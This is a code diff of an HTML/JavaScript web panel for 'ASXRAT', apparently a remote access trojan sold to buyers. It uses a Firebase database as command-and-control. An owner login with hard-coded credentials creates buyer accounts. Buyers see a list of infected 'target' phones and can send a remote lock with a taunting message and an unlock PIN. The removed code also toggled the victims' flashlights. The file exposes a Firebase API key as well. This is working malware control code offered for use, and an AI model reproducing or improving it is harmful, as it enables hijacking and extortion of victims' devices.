@@ -1,67 +1,85 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>V-PROJECT | RAT SYSTEM</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>V-PROJECT | ELVOXI [IEA]</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    
     <style>
-        body { background: #050505; color: #00ffcc; font-family: monospace; padding: 20px; }
-        .box { border: 2px solid #00ffcc; padding: 20px; border-radius: 15px; max-width: 500px; margin: auto; background: #000; box-shadow: 0 0 20px #00ffcc44; }
-        input { width: 90%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #00ffcc; color: #fff; border-radius: 8px; text-align: center; }
-        .btn { width: 100%; padding: 12px; margin: 5px 0; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
-        .btn-buyer { background: #00ffcc; color: #000; }
-        .btn-red { background: #ff3366; color: #fff; }
-        .target-item { background: #111; border: 1px solid #00ffcc; padding: 15px; margin: 10px 0; border-radius: 8px; cursor: pointer; transition: 0.3s; }
-        .target-item:hover { background: #00ffcc; color: #000; }
-        #control-section { display: none; margin-top: 20px; border-top: 2px dashed #333; padding-top: 20px; }
-        #login-box, #owner-panel, #buyer-panel { display: none; }
-        .id-badge { color: yellow; font-size: 18px; font-weight: bold; margin-bottom: 15px; }
+        :root { 
+            --neon-green: #00ff88; 
+            --bg-dark: #050505; 
+            --panel: #121216;
+            --blue-btn: #5cb8ff;
+            --gray: #888; 
+        }
+
+        body { background: var(--bg-dark); color: #fff; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; flex-direction: column; }
+        .box { border: 1px solid #222; padding: 25px; border-radius: 20px; width: 340px; background: var(--panel); text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h2 { color: var(--neon-green); letter-spacing: 3px; margin-bottom: 5px; }
+        .sub-txt { color: var(--gray); font-size: 10px; margin-bottom: 20px; text-transform: uppercase; }
+        input { width: 90%; padding: 12px; margin: 10px 0; background: #1a1a20; border: 1px solid #333; color: #fff; border-radius: 10px; outline: none; }
+        button { width: 95%; padding: 12px; cursor: pointer; font-weight: bold; background: var(--neon-green); color: #000; border: none; border-radius: 10px; margin-top: 10px; }
+
+        /* LIST TARGET */
+        .target-card { background: #1a1a20; border: 1px solid #333; padding: 15px; border-radius: 15px; margin-bottom: 10px; text-align: left; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
+        .target-card:hover { border-color: var(--neon-green); }
+
+        /* MODAL STYLE GACOR */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; z-index: 999; backdrop-filter: blur(8px); }
+        .modal-content { background: #111115; border: 1px solid #333; padding: 25px; border-radius: 25px; width: 300px; }
+        .field-label { font-size: 11px; color: var(--gray); margin-left: 5px; display: block; margin-top: 10px; }
+        .modal-input { width: 90%; background: #000; border: 1px solid #333; border-radius: 12px; padding: 12px; color: var(--neon-green); }
+        .btn-send { background: var(--blue-btn) !important; color: #000 !important; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-<div id="login-box" class="box" style="display: block;">
-    <h2>ASXRAT LOGIN</h2>
-    <input type="text" id="user" placeholder="Username">
-    <input type="password" id="pass" placeholder="Password">
-    <button class="btn btn-buyer" onclick="handleLogin()">LOGIN</button>
-</div>
+    <div id="page-login" class="box">
+        <h2>ASXRAT REALTIME</h2>
+        <div class="sub-txt">JANGAN MEMBAGIKAN USERNAME DAN PW AKJN ANDA</div>
+        <input type="text" id="log-user" placeholder="USERNAME">
+        <input type="password" id="log-pass" placeholder="PASSWORD">
+        <button onclick="handleLogin()">LOGIN</button>
+    </div>
 
-<div id="owner-panel" class="box">
-    <h3>OWNER PANEL</h3>
-    <input type="text" id="new_u" placeholder="Buyer Username">
-    <input type="text" id="new_p" placeholder="Buyer Password">
-    <button class="btn btn-buyer" style="background:#bb00ff; color:#fff" onclick="createAccount()">CREATE BUYER</button>
-    <hr color="#222">
-    <div id="list-account"></div>
-</div>
+    <div id="page-admin" class="box" style="display:none;">
+        <h2>ADMIN PANEL</h2>
+        <div class="sub-txt">Register New Buyer</div>
+        <input type="text" id="reg-user" placeholder="USERNAME">
+        <input type="text" id="reg-pass" placeholder="PASSWORD">
+        <button onclick="createAccount()">CREATE ACCOUNT</button>
+        <button onclick="location.reload()" style="background: #ff4444; color: white;">LOGOUT</button>
+    </div>
 
-<div id="login-box" class="box" style="display: block;">
-    <h2>ASXRAT REALTIME</h2>
-<div id="buyer-panel" class="box">
-    <div class="id-badge">ID ANDA: <span id="display_my_id"></span></div>
-    <p style="font-size: 10px;">LIST TARGET ONLINE:</p>
+    <div id="page-buyer" class="box" style="display:none;">
+        <h2 id="user-title">ASXRAT REALTIME</h2>
+        <div class="sub-txt">Click Target to Open Controls</div>
+        <div id="target-list">Scanning...</div>
+        <button onclick="location.reload()" style="background: #ff4444; color: white;">LOGOUT</button>
+    </div>
     
-    <div id="target-list">
-        <p style="color:#555">Menunggu target...</p>
+   
+    <div id="modal-ctrl" class="modal">
+        <div class="modal-content">
+            <h3 style="color: var(--blue-btn); margin-top: 0;">🔒 Locked Device</h3>
+            
+            <label class="field-label">Lock Message</label>
+            <input type="text" id="lock-msg" class="modal-input" placeholder="mampus lu anj">
+
+            <label class="field-label">Unlock PIN</label>
+            <input type="number" id="lock-pin" class="modal-input" placeholder="142535">
+
+            <button class="btn-send" onclick="sendLock()">SEND LOCK</button>
+            <button onclick="sendUnlock()" style="background:none; color:#ff4444; border:1px solid #ff4444; width:100%; padding:10px; border-radius:10px; margin-top:10px; font-weight:bold;">UNLOCK</button>
+            <button onclick="closeModal()" style="background:none; color:var(--gray); border:none; width:100%; margin-top:10px; cursor:pointer;">CANCEL</button>
+        </div>
     </div>
 
-    <div id="control-section">
-        <p>CONTROLING: <b id="target_name_display" style="color:yellow"></b></p>
-        <div style="display:flex; gap:5px;">
-            <button class="btn btn-buyer" onclick="send('senter', 'ON')">SENTER ON</button>
-            <button class="btn btn-red" onclick="send('senter', 'OFF')">OFF</button>
-        </div>
-        <div style="display:flex; gap:5px;">
-            <button class="btn btn-red" onclick="send('lock', 'ON')">LOCK</button>
-        </div>
-        <button class="btn btn-red" onclick="closeControl()" style="margin-top:10px; font-size:10px;">TUTUP KONTROL</button>
-    </div>
-</div>
-
-<script>
-    const firebaseConfig = {
+    <script>
+        const firebaseConfig = {
       apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
       authDomain: "rat-html.firebaseapp.com",
       databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
@@ -71,75 +89,83 @@
       appId: "1:1060124583265:web:a117830e798cd1d60f5120",
       measurementId: "G-XMHT2S731L"
     };
+        
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        let loggedUser = "";
+        let selectedTid = "";
 
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-    let myActiveID = "";
-    let selectedTargetDevice = "";
+        // --- FUNGSI LOGIN ---
+        function handleLogin() {
+            let u = document.getElementById('log-user').value;
+            let p = document.getElementById('log-pass').value;
 
-    function handleLogin() {
-        const u = document.getElementById('user').value;
-        const p = document.getElementById('pass').value;
-        if(u === "elvoxi123" && p === "123") {
-            document.getElementById('login-box').style.display = 'none';
-            document.getElementById('owner-panel').style.display = 'block';
-            loadAccounts();
-        } else {
-            db.ref('accounts/' + u).once('value', (s) => {
-                if(s.exists() && s.val().pass === p) {
-                    myActiveID = s.val().targetID;
-                    document.getElementById('login-box').style.display = 'none';
-                    document.getElementById('buyer-panel').style.display = 'block';
-                    document.getElementById('display_my_id').innerText = myActiveID;
-                    listenTargets();
-                } else { alert("Data Salah!"); }
+            // Admin Login
+            if (u === "elvoxi" && p === "123") {
+                showPage('page-admin');
+            } else {
+                // Buyer Login
+                db.ref("accounts/" + u).once("value", (snap) => {
+                    if (snap.exists() && snap.val().pw === p) {
+                        loggedUser = u;
+                        showPage('page-buyer');
+                        document.getElementById('user-title').innerText = u.toUpperCase();
+                        fetchTargets(u);
+                    } else { alert("Login Gagal!"); }
+                });
+            }
+        }
+
+        function createAccount() {
+            let u = document.getElementById('reg-user').value;
+            let p = document.getElementById('reg-pass').value;
+            if(u && p) {
+                db.ref("accounts/" + u).set({ pw: p }).then(() => alert("User " + u + " Created!"));
+            }
+        }
+
+        // --- LOAD TARGET ---
+        function fetchTargets(user) {
+            db.ref("users/" + user).on("value", (snap) => {
+                const list = document.getElementById('target-list');
+                list.innerHTML = "";
+                snap.forEach((child) => {
+                    let hp = child.val().model_hp || "Unknown Device";
+                    let div = document.createElement('div');
+                    div.className = "target-card";
+                    div.innerHTML = `<b>📱 ${hp}</b><small>${child.key}</small>`;
+                    div.onclick = () => openModal(child.key); // KLIK BARU MUNCUL POP-UP
+                    list.appendChild(div);
+                });
             });
         }
-    }
 
-    // Fungsi buat dengerin HP mana aja yang masuk ke ID Buyer ini
-    function listenTargets() {
-        db.ref('users/' + myActiveID).on('value', (snap) => {
-            let html = "";
-            snap.forEach((child) => {
-                const deviceName = child.val().device_info || "Unknown Device";
-                html += `<div class="target-item" onclick="openControl('${child.key}', '${deviceName}')">
-                            📱 ${deviceName} (${child.key})
-                         </div>`;
-            });
-            document.getElementById('target-list').innerHTML = html || "Belum ada target.";
-        });
-    }
+        // --- MODAL LOGIC ---
+        function openModal(tid) {
+            selectedTid = tid;
+            document.getElementById('modal-ctrl').style.display = "flex";
+        }
+        function closeModal() { document.getElementById('modal-ctrl').style.display = "none"; }
 
-    function openControl(deviceId, name) {
-        selectedTargetDevice = deviceId;
-        document.getElementById('target_name_display').innerText = name;
-        document.getElementById('control-section').style.display = 'block';
-    }
+        function sendLock() {
+            let m = document.getElementById('lock-msg').value || "LOCKED";
+            let p = document.getElementById('lock-pin').value || "123";
+            db.ref("users/" + loggedUser + "/" + selectedTid).update({
+                lock: "ON", lock_pesan: m, lock_pw: p
+            }).then(() => { alert("Lock Sent!"); closeModal(); });
+        }
 
-    function closeControl() {
-        document.getElementById('control-section').style.display = 'none';
-    }
+        function sendUnlock() {
+            db.ref("users/" + loggedUser + "/" + selectedTid).update({ lock: "OFF" })
+            .then(() => { alert("Unlocked!"); closeModal(); });
+        }
 
-    function send(k, v) {
-        db.ref('users/' + myActiveID + '/' + selectedTargetDevice + '/' + k).set(v);
-    }
-
-    // Fungsi Owner
-    function createAccount() {
-        const u = document.getElementById('new_u').value;
-        const p = document.getElementById('new_p').value;
-        const tID = "EVX-" + Math.floor(Math.random() * 8999 + 1000);
-        db.ref('accounts/' + u).set({ pass: p, targetID: tID });
-    }
-
-    function loadAccounts() {
-        db.ref('accounts').on('value', (s) => {
-            let h = "";
-            s.forEach((c) => { h += `<div style='border:1px solid #333; margin:5px; padding:5px;'>U: ${c.key} | ID: ${c.val().targetID}</div>`; });
-            document.getElementById('list-account').innerHTML = h;
-        });
-    }
-</script>
+        function showPage(id) {
+            document.getElementById('page-login').style.display = 'none';
+            document.getElementById('page-admin').style.display = 'none';
+            document.getElementById('page-buyer').style.display = 'none';
+            document.getElementById(id).style.display = 'inline-block';
+        }
+    </script>
 </body>
 </html>
